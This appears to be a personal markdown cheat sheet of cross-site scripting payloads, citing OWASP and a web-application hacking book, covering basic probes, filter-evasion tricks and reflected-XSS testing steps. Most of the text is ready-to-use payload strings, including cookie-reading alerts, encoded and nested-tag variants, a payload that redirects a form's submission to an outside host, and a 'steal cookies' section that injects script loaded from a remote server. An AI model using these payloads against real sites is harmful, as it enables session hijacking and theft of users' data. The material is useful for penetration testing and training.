### [OWASP XSS CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

## Contents:

- __[Basic Payloads]()__

- __[Reflected XSS Vulnerabilities]()__

- __[Stored XSS Vulnerbilities]()__

&nbsp;
&nbsp;
&nbsp;


__Basic Payloads:__

	"><img=src="aa" onerror="alert(document.domain)">

	"><svg/onload="alert(document.domain)">

	“><script>alert(document.cookie)</script>
	

__Notes___:

- This string is submitted as every parameter to every page of the application,
  and responses are monitored for the appearance of this same string. If cases
  are found where the attack string appears unmodifi ed within the response, the
  application is almost certainly vulnerable to XSS.

&nbsp;
&nbsp;
&nbsp;


__Passing Filters__: (Chapter 12: XSS Web App )

	“><script >alert(document.cookie)</script >
	
	“><ScRiPt>alert(document.cookie)</ScRiPt>
	
	“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
	
	“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
	
	%00“><script>alert(document.cookie)</script>


&nbsp;
&nbsp;
&nbsp;

### Finding and Exploiting Refl ected XSS Vulnerabilities


- The most reliable approach to detecting refl ected XSS vulnerabilities involves
  working systematically through all the entry points for user input that were
  identifi ed during application mapping


	- Submit a benign alphabetical string in each entry point.
	
	- Identify all locations where this string is refl ected in the application’s response.

	- For each refl ection, identify the syntactic context in which the reflected data appears.
	
	
	- Submit modified data tailored and check the reponse of the application (reflected or filtered)



### Script Tags

- Beyond directly using a <script> tag, there are various ways in which you can
  use somewhat convoluted syntax to wrap the use of the tag, defeating some fi lters:
	  
	  
		<object data=”data:text/html,<script>alert(1)</script>”>
		
		<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
		
		<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
		
		Click here</a>




__Complex Payload using POST method__

	"><svg/onload="document.forms[1].action='//sitecom.site/text.php'">



__PART2: Complex JS payload to steal Cookies:__


	- host JS file on the server. 

	- The file has an alert("XSS"); function

	- Craft a payload to connect to it :

		var s= document.createElement('SCRIPT');
		s.src= '//text.site/alert.php';

		document.body.appendChild(s);
		
	
	- Url:  "><svg/onload="var s= document.createElement('SCRIPT');s.src='//text.site/alert.php';document.body.appendChild(s);"

	

__Image Payload__ :

	- URL>>number.php?name=noImage.jpg' onerror=alert("xss");>
	
	- URL >> https://xss-doc.appspot.com/demo/3#imge.jpg' onerror=alert("xss");>

	

__XSS DOM:__ DOM runs on the client side,the payloads are process on the browser and not on the server side 
